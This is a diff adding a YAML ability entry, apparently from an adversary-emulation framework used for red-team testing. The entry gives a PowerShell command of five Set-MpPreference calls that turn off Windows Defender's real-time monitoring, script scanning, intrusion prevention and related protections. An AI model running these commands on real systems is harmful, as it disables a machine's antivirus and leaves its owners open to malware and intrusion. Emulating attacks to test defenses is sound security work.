@@ -1,0 +1,23 @@
+id: b007f6e8-4a87-4440-8888-29ceab047d9b
+metadata:
+  version: 1
+  authors:
+    - privateducky
+  tags: []
+name: Disable Windows Defender
+description: |
+  Windows Defender is the defacto standard antivirus on Windows computers. It will block normal malicious activity on
+  a computer. However you can disable it for a period of time using this procedure.
+tactic: defense-evasion
+technique:
+  id: T1089
+  name: Disabling Security Tools
+platforms:
+  windows:
+    psh:
+      command: |
+        Set-MpPreference -DisableIntrusionPreventionSystem $true;
+        Set-MpPreference -DisableIOAVProtection $true;
+        Set-MpPreference -DisableRealtimeMonitoring $true;
+        Set-MpPreference -DisableScriptScanning $true;
+        Set-MpPreference -EnableControlledFolderAccess Disabled;
